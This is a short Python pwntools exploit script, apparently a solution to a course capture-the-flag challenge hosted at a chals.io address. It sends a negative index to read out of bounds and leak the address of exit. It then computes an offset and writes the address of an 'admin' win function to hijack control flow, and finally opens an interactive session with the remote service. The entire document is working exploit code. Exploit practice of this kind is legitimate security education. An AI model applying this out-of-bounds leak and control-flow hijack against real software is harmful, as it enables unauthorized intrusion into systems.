from pwn import *

binary = 'chal.bin'
e = context.binary = ELF(binary, checksec=False)

# p = process(binary)
p = remote("cse4850-oob-1.chals.io", 443, ssl=True, sni="cse4850-oob-1.chals.io")

# read through song poll
p.recvuntil(b'>>> ')

# negative to go backward on stack to exit function
p.sendline(b'-6')

# read until exit leak
p.recvuntil(b': ')

# save leak address
address = int(p.recvline(), 16) 

# read song vote
p.recvuntil(b'>>> ')

# get the offset of the leaked address
offset = (address - e.sym['exit']) - 6

# get address of admin(win) function
# p.sendline(p64(0x1203))
win = e.sym['admin'] + offset

# send win
p.sendline(p64(win))

# read through song poll
p.recvuntil(b'>>> ')

# 
p.sendline(b'0')

p.interactive()

